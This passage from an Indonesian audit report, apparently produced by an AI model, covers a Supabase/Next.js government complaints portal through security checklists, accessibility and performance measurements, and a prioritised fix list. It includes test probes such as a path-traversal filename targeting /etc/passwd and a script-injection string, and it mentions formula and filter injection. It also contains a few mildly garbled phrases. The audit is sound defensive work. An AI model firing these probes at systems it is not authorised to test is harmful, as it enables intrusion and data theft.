| `npm audit` bersih | **GAGAL** | 1 critical, 6 high, 2 moderate (P0-3) — sudah di-upgrade ke `14.2.35` (6 Okt 2026) tetapi angkanya tidak berubah |
| Secret service role bocor ke bundle | **LULUS** | Tidak ditemukan di `.next/static` maupun `.next/server` |
| Anon key hanya yang terekspos | **LULUS** | Hanya `NEXT_PUBLIC_SUPABASE_ANON_KEY`, sesuai desain |
| `.env` di-ignore | **LULUS** | `.gitignore` benar |
| Riwayat git bersih | **LULUS** | 1 commit, hanya placeholder `eyJ...` |

### 3.2 Otorisasi & Akses

| Item | Status | Catatan |
|---|---|---|
| Tabel `complaints` tidak bisa ditulis anon | **LULUS** | HTTP **42501** (RLS) |
| Tabel `admins` tidak bisa dibaca anon | **LULUS** | `[]`, `content-range: */0` |
| Tabel `ip_rate_limits` tidak bisa diakses anon | **LULUS** | `[]`, `content-range: */0` |
| `complaint_photos` tidak bisa ditulis anon | **LULUS** | HTTP 42501 |
| RLS aktif di keempat tabel | **LULUS** | Terlihat dari galat 42501; `schema.sql:126-129` |
| Anon **tidak bisa** mengenumerate isi bucket | **LULUS** *(diperbaiki 6 Okt 2026)* | Policy `SELECT` sudah di-drop → `POST /storage/v1/object/list/complaint-photos` dengan `{"prefix":"complaints/"}` kini mengembalikan `[]`. Lihat P1-7 |
| Anon tidak bisa upload langsung | **LULUS** | HTTP 403 RLS |
| Anon tidak bisa overwrite | **LULUS** | HTTP 403 RLS |
| Endpoint admin menolak tanpa cookie | **LULUS** | HTTP 403 |
| Endpoint admin menolak user **non-admin** | **LULUS** | User auth non-admin dibuat khusus untuk uji → HTTP 403 di semua endpoint admin |
| Non-admin tidak bisa akses tabel lewat REST langsung | **LULUS** | `complaints`, `admins`, `ip_rate_limits` → `[]` semua |
| IDOR: PATCH/DELETE tanpa cookie | **LULUS** | HTTP 403 |
| IDOR: hapus laporan lain tidak menghapus fotonya | **LULUS** | Foto korban tetap HTTP 200 setelah laporan penyerang dihapus |
| Middleware melindungi `/admin` | **LULUS** | Redirect 307 ke login |
| Middleware **memeriksa role**, bukan hanya login | **GAGAL** | `src/middleware.ts:38-50` hanya memeriksa `user`; role dicegah di layer API saja (tetap aman, tapi route UI tidak terlindungi sendiri) |
| `verifyAdminSession()` pakai `getUser()` bukan `getSession()` | **GAGAL** | `complaints/[id]/route.ts:11`, `admin/complaints/route.ts`, `admin/users/route.ts` — `getSession()` membaca JWT dari cookie **tanpa verifikasi tanda tangan** |
| Admin tidak bisa menghapus dirinya sendiri | **LULUS** | HTTP 400 dengan pesan jelas |
| Password admin minimal 8 karakter | **LULUS** | HTTP 400 |

### 3.3 Rate Limit & Anti-Abuse

| Item | Status | Catatan |
|---|---|---|
| Rate limit aktif pada `/api/complaints` | **LULUS** | 12 POST IP sama → 5 sukses, 7 ditolak 429 |
| Rate limit tahan rotasi IP | **GAGAL** | 12 POST IP berbeda → **12/12 sukses** (P1-1) |
| Rate limit ditegakkan di `/api/upload-url` | **GAGAL** | Tidak pernah mencatat hit → 8/8 HTTP 200 (P1-2) |
| Honeypot berfungsi | **LULUS** | Ditolak HTTP 400 |
| CAPTCHA / challenge | **TIDAK ADA** | Tidak ada implementasi sama sekali |
| Hash IP memakai salt | **GAGAL** | `rate-limiter.ts:7-9` SHA-256 polos, tanpa salt |
| Rate limiter gagal dalam kondisi *fail-closed* | **GAGAL** | `rate-limiter.ts:36-39, 47-50` fail-open |

### 3.4 Validasi Input & Integritas Data

| Item | Status | Catatan |
|---|---|---|
| Minimal 3 foto | **LULUS** | HTTP 400 |
| Maksimal 6 foto | **LULUS** | 7 foto ditolak HTTP 400 |
| NIP harus 18 digit | **LULUS** | 17 digit, 19 digit, huruf, kosong, spasi → semua ditolak |
| Leading zero NIP dipertahankan | **LULUS** | `0000…0000` tetap utuh di DB |
| NIP wajib diisi | **LULUS** | HTTP 400 "Required" |
| Batas panjang & `trim` field | **LULUS** | `validations.ts:25-53` |
| Mass assignment dihalangi | **LULUS** | `status`, `tanggal_selesai`, `catatan_admin`, `id`, `nomor_laporan` diabaikan |
| Nomor laporan unik tanpa collision | **LULUS** | 5 submit paralel → 5 nomor unik; 116 baris → 0 duplikat |
| Tanggal di masa depan ditolak | **GAGAL** | `2099-12-31` dan `1800-01-01` **diterima** HTTP 200 |
| Tanggal kalender tidak ada ditolak | **GAGAL** | `2026-02-31` lolos regex → **HTTP 500**; `2026-13-01` → HTTP 500 |
| `tanggal_selesai` ≥ `tanggal_keluhan` | **LULUS** | Ditolak HTTP 400 dengan pesan tepat |
| Status enum tervalidasi | **LULUS** | `"DIREKTORAT"` ditolak |
| `status` wajib ada saat PATCH | **LULUS** | HTTP 400 |

### 3.5 Unggah & Penyimpanan

| Item | Status | Catatan |
|---|---|---|
| Bucket publik dengan limit & MIME benar | **LULUS** | `public:true`, 5.242.880 byte, `image/jpeg\|png\|webp` |
| Batas 5 MB ditegakkan | **LULUS** | File 6 MB → HTTP 413 |
| MIME `text/html` ditolak saat PUT | **LULUS** | HTTP 415 |
| MIME `image/svg+xml` ditolak | **LULUS** | HTTP 400 |
| **Magic bytes divalidasi** | **GAGAL** | Teks `GIF89a` di-PUT sebagai `image/jpeg` → **HTTP 200** |
| HTML/EXE bernama `.jpg` ditolak | **GAGAL** | Diterima sebagai `image/jpeg` |
| Nama file tidak memengaruhi path server | **LULUS** | `../../etc/passwd.jpg` → `complaints/<ts>-<uuid>.jpg` (`upload-url/route.ts:42-46`) |
| Signed URL berlaku 15 menit seperti komentar | **GAGAL** | JWT `exp - iat` = **7200 detik (2 jam)**; komentar di `upload-url/route.ts:48` salah |
| Signed URL sekali pakai | **LULUS** | PUT kedua → HTTP 400 |
| Upload tanpa“Muat Ulang”_duplikat | **LULUS** | Tidak ada alur resubmit pada error |
| Batas jumlah file per request | **LULUS** | `validations.ts:19-20` |

### 3.6 XSS & Injection

| Item | Status | Catatan |
|---|---|---|
| XSS tersimpan di nama/deskripsi | **LULUS** | Disimpan, tetapi **React meng-escape**; tidak ada `dangerouslySetInnerHTML` di seluruh source |
| XSS via `catatan_admin` ke halaman publik | **LULUS** | `<script>alert(document.domain)</script>` → JSON apa adanya, HTML ter-escape, tidak dieksekusi |
| SQL injection | **LULUS** | Tidak ada SQL mentah; hanya PostgREST builder |
| PostgREST filter injection | **GAGAL** | HTTP 500 + kebocoran skema (P2-2) |
| CSV formula injection | **GAGAL** | 65 sel executable (P1-4) |
| Open redirect | **GAGAL** | TerbuktiLeaving origin (P1-3) |
| SSRF | **TIDAK TERUJI** | Requires Vercel/internal network |

### 3.7 Skema & Database

| Item | Status | Catatan |
|---|---|---|
| Satu sumber kebenaran skema | **GAGAL** | **Tiga** definisi berbeda (`schema.sql`, `supabase-migration.sql`, view live) |
| View `complaints_public` menyamarkan NIP dengan benar | **GAGAL** | 14 dari 18 digit terekspos (P0-1) |
| Sekuens nomor laporan tidak dapat diulang | **LULUS** | `PK-2026-…` naik monoton; data uji yang dihapus **tidak** mengembalikan nomor (benar untuk audit trail, perlu dicatat ke pengguna) |
| `rowsecurity` pada keempat tabel | **TIDAK TERUJI** | Tidak ada akses SQL editor |
| Security Advisor Supabase | **TIDAK TERUJI** | Tidak ada akses Dashboard |
| Definisi policy live vs repo | **TIDAK TERUJI** | Hanya terverifikasi lewat perilaku HTTP, bukan DDL |
| Tabel tambahan di schema `public` | **TIDAK TERUJI** | `/rest/v1/` OpenAPI menolak `anon` **dan** `service_role` — tidak bisa dienumerasi |

### 3.8 Perilaku Admin & CRUD

| Item | Status | Catatan |
|---|---|---|
| Login admin via UI | **LULUS** | HTTP 200 token, dashboard ter-render, 15 baris tabel |
| Login kredensial salah ditolak | **LULUS** | Pesan Indonesia yang tepat (`page.tsx:31-37`) |
| Admin non-`admins` ditolak | **LULUS** | Sign-out otomatis + pesan jelas (`page.tsx:50-56`) |
| Ubah status via UI | **LULUS** | `menunggu → diproses → selesai` |
| `tanggal_selesai` auto-diisi saat `selesai` | **LULUS** | Terisi tanggal hari ini |
| `tanggal_selesai` di-reset saat bukan `selesai` | **LULUS** | Kembali `null` |
| Navigasi menu admin | **LULUS** | Dashboard & Kelola Admin |
| Logout membersihkan cookie | **LULUS** | 0 cookie tersisa; akses `/admin` kembali ter-redirect |
| Konfirmasi hapus punya tombol batal | **LULUS** | Dibatalkan tanpa data terhapus |
| Filter & pencarian di dashboard | **LULUS** | 32 baris → `TEST_Korban` → 1 baris |
| Tombol CSV nonaktif saat 0 hasil | **LULUS** | Perilaku benar |
| Ekspor CSV memakai BOM UTF-8 | **LULUS** | `\uFEFF` (`utils.ts:98`) → terbaca benar di Excel Windows |
| Ekspor CSV memuat seluruh data terfilter | **GAGAL** | Hanya 15 baris halaman pertama (P2-5) |
| Tambah admin: email valid | **LULUS** | Ditolak HTTP 400 |
| Tambah admin: password < 8 karakter | **LULUS** | Ditolak HTTP 400 |
| Tambah admin: pesan duplikat | **GAGAL** | Membocorkan detail internal (P3-5) |
| **URL browser benar setelah login** | **GAGAL** | Tetap `/admin/login?redirect=%2Fadmin` padahal dashboard tampil; **tetap berfungsi setelah refresh** (URL kozmetik salah saja) |
| Cookie sesi `httpOnly` | **GAGAL** | `httpOnly=false` → token dapat dibaca JavaScript;-if XSS ada, sesi bisa dicuri |
| Cookie `secure` di produksi | **TIDAK TERUJI** | `secure=false` di localhost; perlu verifikasi di domain HTTPS |
| Refresh token / expiry | **TIDAK TERUJI** | Butuh akses Dashboard |

### 3.9 Public Signup & Konfigurasi Auth

| Item | Status | Catatan |
|---|---|---|
| Public signup dinonaktifkan | **GAGAL** | `GET /auth/v1/settings` → `"disable_signup": false` |
| Signup langsung ditolak | **TIDAK TERUJI** | Percobaan pertama ditolak sebagai domain tidak valid; percobaan kedua HTTP **429**. Pengaturan sudah terbukti salah |
| Email confirmation aktif | **TIDAK TERUJI** | Perlu Dashboard |
| Redirect URL production | **TIDAK TERUJI** | Perlu Dashboard |

### 3.10 Error Handling & Resilience

| Item | Status | Catatan |
|---|---|---|
| State loading tampil | **LULUS** | "Memuat Data Pengaduan…" |
| State error (HTTP 500) | **LULUS** | "Terjadi Kesalahan" + pesan + tombol **Muat Ulang** |
| State error (jaringan putus) | **GAGAL** | Menampilkan `"Failed to fetch"` mentah (P2-6) |
| State kosong | **LULUS** | "Tidak Ada Laporan Ditemukan" |
| Error tidak membocorkan stack trace | **LULUS** | Tidak ada stack di body respons |
| Error PostgREST membocorkan skema | **GAGAL** | Pesan mentah dikembalikan (`complaints/route.ts:64`) |
| Tidak ada custom `error.tsx` | **GAGAL** | Halaman 404/500 memakai default Next (P3-3) |

### 3.11 Kebersihan Lingkungan Uji

| Item | Status | Catatan |
|---|---|---|
| Laporan `TEST_` dihapus | **LULUS** | 117 baris dihapus |
| `complaint_photos` dihapus | **LULUS** | 0 baris tersisa |
| Object Storage dihapus | **LULUS** | 0 object tersisa (butuh `prefixes`, bukan `paths`) |
| `ip_rate_limits` dikosongkan | **LULUS** | 120 baris → 0 |
| Akun admin uji dihapus | **LULUS** | `qa.audit.admin@…` dan `qa.audit.nonadmin@…` dihapus |
| Admin asli utuh | **LULUS** | `admin@kemenkes.go.id` tidak tersentuh |
| Data asli tidak dihapus | **LULUS** | Laporan `PK-2026-5122` (Ahmad Faishal Imran, dibuat 03:38 UTC setelah cleanup) **sengaja dibiarkan** |
| `.env` tidak dimodifikasi | **LULUS** | Salinan ada di `C:\Users\PC\AppData\Local\Temp\opencode\sipeka\env.json`, **wajib dihapus manual** |

### 3.12 Koreksi hasil pengujian

| Item | Status | Catatan |
|---|---|---|
| ~~`/favicon.ico` → HTTP **500**~~ | **[DIKOREKSI]** | Bukan bug aplikasi. `next dev` + `next build` saya menulis ke `.next` yang sama sehingga `_document.js` rusak. Setelah build terisolasi: **404** (tetap temuan P3-2) |
| ~~`/api/complaints/:id` → HTTP 500~~ | **[DIKOREKSI]** | Swallowing error. Setelah build terisolasi: UUID valid → **200**, UUID tak ada → **404** dengan pesan jelas |
| ~~`?page=50` → HTTP 500~~ | **[DIKOREKSI]** | Swallowing error. Setelah build terisolasi: **200** |
| ~~Rate limit tidak berjalan sama sekali~~ | **[DIKOREKSI]** | Tidak akurat. Rate limit **berjalan**; yang dapat dilewati hanya melalui rotasi IP |
| ~~`storage_path` traversal & `javascript:` ditolak~~ | **[DIKOREKSI]** | Hasil void karena probe memakai 1 foto (butuh ≥3). Setelah diulang dengan 3 foto: **semua diterima** (P2-1) |
| ~~Error state identik dengan empty state~~ | **[DIKOREKSI]** | Salah baca. Snapshot terpotong 300 karakter. Setelah diuji penuh: error state **berfungsi benar** |
| ~~Halaman `/admin/login` memiliki 6 pelanggaran axe~~ | **[DIKOREKSI]** | Hasil void. Sesi uji masih aktif, sehingga `middleware.ts:49-50` mengarahkan permintaan ke `/admin`. Data "login" ternyata identik dengan `/admin` — **halaman login belum pernah di-audit dengan axe**. Nilainya ditandai `TIDAK TERUJI` di bagian 4.1 |
| ~~H1 putih kontras 1.05:1 di halaman `/`~~ | **[DIKOREKSI]** | Artefak pengukuran. Elemen berada di atas gradient; `getComputedStyle` hanya mengembalikan `background-color`. axe **tidak** menandai H1 — temuan ini dibatalkan |

---

## 4. Penilaian UI/UX

> **Metode.** Model yang menjalankan audit ini tidak dapat melihat gambar, jadi penilaian visual dibuat dari **DOM, computed styles, rasio kontras terhitung, ukuran target sentuh, urutan tab, dan axe-core**. Screenshot tetap diambil di `…\sipeka\shots\` (1440/1024/768/375/320 px).ighthouse mobile juga dijalankan sebagai sinyal independen. Klaim di bawah berbasis pengukuran, bukan kesan.

### 4.1 Skor otomatis

| Halaman | Performa | Aksesibilitas | Best Practices | SEO | axe (jumlah node) |
|---|---|---|---|---|---|
| `/` | 0.86 | 0.87 | 0.96 | 1.00 | **3** |
| `/lapor` | 0.97 | 0.88 | 0.96 | 1.00 | **5** |
| `/admin/login` | 0.96 | 0.95 | 0.96 | 1.00 | **TIDAK TERUJI** |
| `/admin` | — | — | — | — | **8** |
| `/admin/users` | — | — | — | — | **6** |
| `/keluhan/[id]` | — | — | — | — | **2** |

Axe dijalankan dengan tag `wcag2a, wcag2aa, wcag21a, wcag21aa, best-practice`. Rincian per halaman:

| Halaman | Rincian pelanggaran |
|---|---|
| `/` | `color-contrast`:1 · `label`:2 (kedua input `type="date"` pada filter) |
| `/lapor` | `color-contrast`:3 · `heading-order`:1 · `label`:1 (input `tanggal_keluhan`) |
| `/admin` | `button-name`:2 · `color-contrast`:1 · `label`:2 · `landmark-main-is-top-level`:1 · `landmark-no-duplicate-main`:1 · `landmark-unique`:1 |
| `/admin/users` | `color-contrast`:3 · 3 pelanggaran landmark |
| `/keluhan/[id]` | `color-contrast`:1 · `heading-order`:1 |

> **[CARA PENGUKURAN] Halaman `/admin/login` tidak pernah di-audit dengan axe.** Sesi uji masih aktif saat pemindaian, sehingga `middleware.ts:49-50` mengarahkan `/admin/login` → `/admin`. Data axe maupun DOM untuk "login" ternyata **identik byte-per-byte** dengan `/admin` — keduanya mengukur dashboard yang sama. Klaim aksesibilitas halaman login di bawah bersumber dari **Lighthouse (0.95, dijalankan tanpa sesi)** dan **pembacaan kode langsung** `src/app/admin/login/page.tsx:94-123`, bukan dari axe.

### 4.2 Aksesibilitas

**LULUS**
- Focus ring terlihat pada **semua** elemen di urutan tab (0 dari 66 langkah tab tanpa fokus terlihat).
- Lightbox terbuka dengan klik dan tertutup dengan `Esc`, plus navigasi panah kiri/kanan (`PhotoLightbox.tsx:30-34`).
- `lang="id"`, `<title>` dan `meta description` ada di semua halaman.
- Tidak ada emoji sebagai ikon (`emojiIcons: []`, `emojiInText: []` di semua halaman); ikon konsisten memakai `lucide-react` — 55 SVG di `/`, 16 di `/lapor`, 16 di `/keluhan/[id]`, 80 di dashboard admin.

**GAGAL**

| Temuan | Level | File | Dampak |
|---|---|---|---|
| **Field formulir tanpa nama aksesibel** | critical (WCAG 4.1.2) | `src/app/lapor/page.tsx`, `src/app/admin/login/page.tsx:96-122`, `src/app/page.tsx:224-230` | `/lapor`: **8 field** tanpa label — 5× text, `tanggal_keluhan` (date), `deskripsi` (textarea), upload (file). `/admin/login`: **2 field** (`Email Resmi Petugas` label di `:96-99`, `Kata Sandi` di `:111-114`) — keduanya punya `<label>` visual tetapi **tanpa `htmlFor` dan tidak membungkus input**; input adalah *sibling* di `:100-107` dan `:115-122`. `/`: 2 input tanggal (`:254-262`, `:264-272`) — "Rentang Tanggal:" di `:249-252` hanya `<span>`, bukan `<label>` |
| Tombol ikon tanpa nama aksesibel | critical (WCAG 4.1.2) | `src/app/admin/page.tsx`, `src/app/page.tsx:232-242` | `button-name`:2 di dashboard — tombol navigasi periode (`<button disabled class="p-1.5 rounded-lg …">`) hanya berisi SVG. Di `/` ada tombol "hapus pencarian" (`:232-242`, ikon `X` tanpa teks/`aria-label`) yang **tidak** tertangkap axe karena hanya dirender saat `search` terisi — cacat yang sama, belum terlihat pemindai |
| Kontras warna gagal | serious (WCAG 1.4.3) | `src/components/Footer.tsx`, `src/app/lapor/page.tsx`, `src/app/admin/users/page.tsx` | Terverifikasi 4 rasio: footer `text-slate-500` di atas `bg-slate-900` = **3.75:1** (butuh 4.5); `text-slate-400` di atas putih = **2.56:1** (counter "0/18", "Minimal 10 karakter", "Tidak dapat dihapus"); `text-slate-500` di atas `bg-slate-300` = **3.21:1** (tombol "KIRIMKAN LAPORAN"); "Hapus" = **4.41:1** |
| Lightbox tanpa semantik dialog | serious | `src/components/PhotoLightbox.tsx:54-57` | `<div onClick>` tanpa `role="dialog"`, `aria-modal`, `aria-label`; **tanpa focus trap** — pengguna keyboard bisa Tab ke elemen di belakang modal. Tombol tutup **ada** (`:59-65`) dan `Esc` bekerja (`:30-34`) |
| **Tidak ada `aria-live` di seluruh aplikasi** | serious | — | `ariaLive: []` pada keenam halaman yang diukur. Perubahan statistik, hasil pencarian, dan pesan error **tidak diumumkan** screen reader |
| Duplicated `<main>` | moderate | `src/app/admin/layout.tsx` | 3 pelanggaran landmark: `landmark-no-duplicate-main`, `landmark-main-is-top-level`, `landmark-unique` — ada **dua** `<main>` bersarang di layout admin |
| `heading-order` melompat | moderate | `src/app/lapor/page.tsx`, `src/app/keluhan/[id]/page.tsx` | `<h1>` → `<h3>` tanpa `<h2>` ("Identitas Pelapor", "Deskripsi Kerusakan") |
| **Target sentuh < 44×44 px** | moderate (WCAG 2.5.8) | `src/app/page.tsx`, `src/app/admin/page.tsx` | `/`: **29 elemen** — link nomor laporan `h=24`, link "Rincian" `h=34`, tombol halaman `36×36`, "Sebelumnya"/"Berikutnya" `h=38`, filter status `h=40`. `/admin`: **70 elemen** — link navigasi `h=36`, "Halaman Publik"/"Keluar" `h=32`. `/lapor`: 0 · `/keluhan/[id]`: 2 |

> **[CARA PENGUKURAN] Nilai kontras di atas diambil dari pelanggaran axe**, yang hanya menandai pasangan warna yang benar-benar gagal. Pengukuran `getComputedStyle` tambahan saya menghasilkan angka jauh lebih rendah (mis. H1 putih = 1.05:1) pada elemen yang duduk di atas **gradient** — itu artefak, karena `getComputedStyle` hanya mengembalikan `background-color` dan tidak bisa_me-resolve gradient. Angka artefak tersebut **tidak** dipakai sebagai temuan, dan axe tidak menandai H1.

### 4.3 Karakter & identitas visual

Penilaian ini jujur negatif — tampilannya terbaca sebagai template bawaan yang belum dimodifikasi:

| Aspek | Temuan | Dasar pengukuran |
|---|---|---|
| Tipografi | **Hanya 2 font family, keduanya bawaan OS.** `ui-sans-serif, system-ui` + `ui-monospace` | `distinctFontFaces` di seluruh `h1..h4, p, span, button, a` |
| Radius | `9999px` dipakai **25×** di `/` — semuanya bentuk pil | `ui.home.radii`: `{12px:22, 8px:35, 9999px:25, 16px:2, 4px:2}` |
| Bayangan | **1 shadow identik** dipakai 32 elemen | `ui.home.shadows`: satu kunci, count 32 |
| Gradien | 2 gradien + 1 `backdrop-filter` (glassmorphism navbar) | `ui.home`: `gradients:2, backdropFilter:1` |
| Gerak | 45 transisi, **1 animasi** (`animate-pulse` pada titik hijau status) | `ui.home`: `transitions:45`, `animated:1` |
| Meta | Tidak ada `canonical`, tidak ada `robots`, tidak ada Open Graph | `ui.home`: `canonical: null`, `robots: null` |

Tidak ada karakter khas: tidak ada logo kustom (hanya `Building2` dari lucide), tidak ada ilustrasi, tidak ada pola. Untuk portal layanan pemerintah, hierarki informasi dan keterbacaannya **memadai** — cepat dipindai dan jelas — tetapi identitas visualnya generik dan tidak terlihat dirancang.

### 4.4 Responsif & Fluid

| Width | `/` | `/lapor` | `/keluhan/[id]` |
|---|---|---|---|
| 320 px | ✅ tanpa overflow | ✅ | ✅ |
| 375 px | ✅ | ✅ | ✅ |
| 768 px | ✅ | ✅ | — |
| 1024 px | ✅ | ✅ | — |
| 1440 px | ✅ | ✅ | ✅ |

Tidak ada horizontal overflow di lebar mana pun yang diuji. Formulir `/lapor` 39.6 kB — halaman terbesar, wajar karena 8 field + upload + preview.

### 4.5 Alur pengguna

**LULUS**
- Alur publik → laporan → detail → verifikasi bersih; breadcrumb ada; empty/error/loading state lengkap.
- Tombol **Muat Ulang** pada error state — sangat baik.
- Setelah submit tidak ada halaman konfirmasi/berkas tersendiri; sukses ditampilkan inline (`src/app/lapor/page.tsx`) — lihat P3-8.
- Halaman login memverifikasi keanggotaan di tabel `admins` **di client** sebelum mengizinkan masuk (`login/page.tsx:44-56`), dan sign-out otomatis bila bukan admin. Ini pola yang tepat.

**GAGAL**
- **URL browser tidak berubah setelah login** (P3-9). Dashboard tampil di address bar `/admin/login?redirect=%2Fadmin`. Tombol **Back** membawa pengguna ke `/admin/login` lagi. Fungsional setelah refresh, tapi membingungkan dan merusak bookmark.
- `/admin/login` yang diakses tanpa login di-redirect ke `/admin/login?redirect=%2Fadmin` (`middleware.ts:43-45`) — redirect ke halaman yang sedang sama, satu langkah sia-sia.
- Cookie sesi `httpOnly=false` (`P3` di 3.8).
- Tidak ada feedback yang diumumkan untuk screen reader saat data termuat atau saat pencarian selesai.

---

## 5. Performa

### 5.1 Lighthouse (mobile, throttling 4× CPU, RTT 150 ms)

| Halaman | FCP | LCP | TBT | CLS | SI | Total |
|---|---|---|---|---|---|---|
| `/` | 0.9 s | 2.1 s | **510 ms** | 0 | 1.5 s | 179 KiB |
| `/lapor` | 0.9 s | 2.2 s | 160 ms | 0 | 1.3 s | 158 KiB |
| `/admin/login` | 0.8 s | 2.3 s | 160 ms | 0 | 1.3 s | 190 KiB |

CLS **0** di semua halaman — layout stabil. Bundle first-load: shared **87.2 kB**, `/` **101 kB**, `/lapor` **134 kB**, middleware **86.3 kB**. Tidak ada render-blocking resource, tidak ada third-party request.

Titik terlemah: **TBT 510 ms di home** dengan 8 long task dan 28 kB unused JavaScript.

### 5.2 Uji beban nyata (5.000 baris `TEST_Load_*` disisipkan via service role)

`/api/complaints` pada **5.032 baris**:

| Query | HTTP | Waktu |
|---|---|---|
| `?limit=12` | 200 | 471 ms |
| `?limit=12&page=1` | 200 | 400 ms |
| `?limit=12&page=2` | 200 | 281 ms |
| `?limit=12&page=50` | 200 | 322 ms |
| `?limit=12&search=Load` | 200 | 309 ms |
| `?limit=12&status=menunggu` | 200 | 295 ms |
| `?limit=12&sort=…&order=asc` | 200 | 301 ms |
| `GET /api/complaints/:id` | 200 | 429 ms |

Render home di 5.032 baris: **1.783 ms** sampai networkidle, **30 kartu**, **781 node DOM**, tanpa N+1.

**Tidak ada ledakan performa.** Ini hasil yang baik untuk 5 ribu baris.

### 5.3 Namun: satu masalah struktural

**`src/app/api/complaints/route.ts:22-31`**

```ts
22:     const { data: statsData } = await supabase
23:       .from('complaints_public')
24:       .select('status');              // ← memuat SELURUH baris, setiap request
25:
26:     const stats = {
27:       total: statsData?.length || 0,
28:       menunggu: statsData?.filter((item) => item.status === 'menunggu').length || 0,
```

Statistik dihitung di **aplikasi** dengan menarik seluruh tabel lalu memfilter di memori — **pada setiap paginasi**. Pada 5.032 baris ini sudah menjadi bagian terbesar dari 280–470 ms, dan akan **menuruk secara linear**: 50 ribu baris berarti menarik 50 ribu baris hanya untuk menghitung 4 angka.

Harus diganti agregasi database:
```sql
select status, count(*) from complaints_public group by status;
```

Fetch foto di `route.ts:74-88` sudah benar (satu `.in()` batch, bukan per-baris).

### 5.4 Lainnya

| Item | Status | Catatan |
|---|---|---|
| Skema tabel terindeks | **LULUS** | `schema.sql:60-61` |
| Fetch foto N+1 | **LULUS** | Batch `.in()` (`route.ts:78`) |
| Batas `limit` mencegah enumerasi massal | **LULUS** | Clamp ke 50 (`route.ts:18`) |
| TTL cache header | **TIDAK TERUJI** | Audit bersifat lokal, tidak mewakili perilaku CDN Vercel |
| Core Web Vitals di produksi | **TIDAK TERUJI** | Butuh domain publik + data RUM |

---

## 6. Rekomendasi Urutan Perbaikan

| # | Tindakan | Temuan | Estimasi |
|---|---|---|---|
| **1** | ~~Cabut policy `storage.objects` `SELECT` untuk `anon`~~ **SELESAI** (6 Okt 2026, sudah diverifikasi) | P1-7 | ~~1 jam~~ |
| **2** | ~~Patch `next` ke versi aman~~ **SEBAGIAN** — sudah ke `14.2.35` (6 Okt 2026), tapi 2 RCE critical masih ada; tetap butuh `15.5.24+` | P0-3 | ~~1–2 jam~~ |
| **3** | Perbaiki masking NIP di view live **dan** di seluruh SQL repo; samakan tiga definisi jadi satu | P0-1 | **2–3 jam** |
| **4** | Tambahkan autentikasi + scoping database ke `/api/cleanup-photos` | P0-2 | **1–2 jam** |
| **5** | Perbaiki sumber IP rate limit; catat hit di `/api/upload-url` | P1-1, P1-2 | **2–3 jam** |
| **6** | Validasi `redirect` di halaman login | P1-3 | **15 menit** |
| **7** | Netralisasi operator formula di `escapeCsv` | P1-4 | **30 menit** |
| **8** | Batasi `remotePatterns` ke domain Supabase proyek | P1-5 | **10 menit** |
| **9** | Tambahkan `SET search_path = public` pada `is_admin()` + 2 trigger | P1-6 | **20 menit** |
| **10** | Validasi ketat `storage_path`/`url` di sisi server; derive `url` dari `path` | P2-1 | **1–2 jam** |
| **11** | Escape input pencarian; pesan error generik | P2-2 | **1 jam** |
| **12** | Perbaiki ekspor CSV agar mencakup seluruh data terfilter | P2-5 | **2–3 jam** |
| **13** | Validasi `NaN` pada `page`/`limit` | P2-3 | **30 menit** |
| **14** | Tambahkan `deskripsi` ke cakupan pencarian | P2-4 | **10 menit** |
| **15** | Validasi kalender nyata + tolak tanggal masa depan | 3.4 | **1 jam** |
| **16** | Validasi magic bytes gambar di server | 3.5 | **3–4 jam** |
| **17** | `htmlFor`/`id` pada 13 kontrol (8 di `/lapor`, 2 di `/admin/login`, 3 di `/`); `aria-label` pada tombol ikon | 4.2 | **2–3 jam** |
| **18** | Security headers di `next.config.js` | P3-1 | **45 menit** |
| **19** | Terapkan `SET search_path` + jalankan Supabase **Security Advisor**; audit drift `pg_policies` | 3.7 | **2 jam** (1 jam jika SQL access diberikan) |
| **20** | `role="dialog"` + `aria-modal` + focus trap pada lightbox; `aria-live` untuk status | 4.2 | **2–3 jam** |
| **21** | Perbaiki statistik O(N) → agregasi SQL | 5.3 | **1–2 jam** |
| **22** | Naikkan target sentuh ke ≥ 44 px — 29 elemen di `/`, 70 di dashboard admin | 4.2 | **2–3 jam** |
| **23** | Perbaiki pesan error jaringan; koherensi landmark admin | P2-6, 4.2 | **1–2 jam** |
| **24** | Tambahkan `favicon`/`icon.png`, `not-found.tsx`, `error.tsx` | P3-2, P3-3 | **2 jam** |
| **25** | Ganti `getSession()` → `getUser()` di 3 route admin | 3.2 | **1 jam** |
| **26** | Nonaktifkan public signup di Supabase | 3.9 | **5 menit** |
| **27** | Atur cookie `httpOnly` | 3.8 | **1 jam** |
| **28** | Tambah konfigurasi ESLint + skrip test | P3-6 | **2–3 jam** |
| **29** | Salt pada `hashIp`; tentukan kebijakan retensi `ip_rate_limits` | 3.3 | **2 jam** |
| **30** | Migration Tailwind 4 (breaking — **`npm audit fix --force` akan memicu ini**, jangan disampur dengan patch keamanan) | P0-3 | **4–8 jam** |
| **31** | Karakter visual: font khas, logo, sistem radius/shadow yang konsisten | 4.3 | **2–3 hari** (opsional, non-blocking) |
**Total P0+P1: 11–14 jam kerja.** Empat hal harus beres sebelum deploy, masing-masing memblokir produksi secara mandiri: **P1-7** (arsip foto Storage bocor ke publik *sekarang*), **P0-1** (NIP pegawai bocor ke publik), **P0-2** (endpoint penghapusan anonim), dan **P0-3** (dua RCE pada Next.js). Item 1 adalah satu-satunya yang bisa diperbaiki dalam 1 jam dan langsung menutup kebocoran yang sedang berlangsung.

### Catatan prioritas tambahan

1. **P1-7 perlu ditangani hari ini, sebelum apa pun.** Kebocoran Storage bukan lagi risiko hipotetis — saat audit ini ditulis, satu request POST anonim berhasil mengambil path foto laporan asli seorang warga beserta `eTag`, ukuran, dan waktu unggahnya. Tidak ada kode yang perlu diubah; cukup satu perubahan policy SQL.
2. **P0-1 dan P2-5 adalah risiko tertinggi berikutnya secara reputasi.** Yang pertama membocorkan identitas pegawai; yang kedua bisa membuat petugas mengira laporan resmi sudah diekspor lengkap padahal hanya 15 baris — lebih buruk daripada sekadar bug.
3. **Perbaikan security akan mengubah perilaku**, jadi jalankan ulang seluruh checklist bagian 3 setelah item 1–9 selesai.
4. **Semua yang TIDAK TERUJI** perlu diverifikasi manual dengan akses Dashboard Supabase — terutama **Security Advisor**, `rowsecurity`, dan policy `storage.objects` yang menjadi akar P1-7. Ketiganya sangat mungkin menambah temuan baru di luar daftar ini.
5. **Tidak ada source code yang diubah selama audit ini.** `AUDIT-LAPORAN.md` adalah satu-satunya file baru di repository.
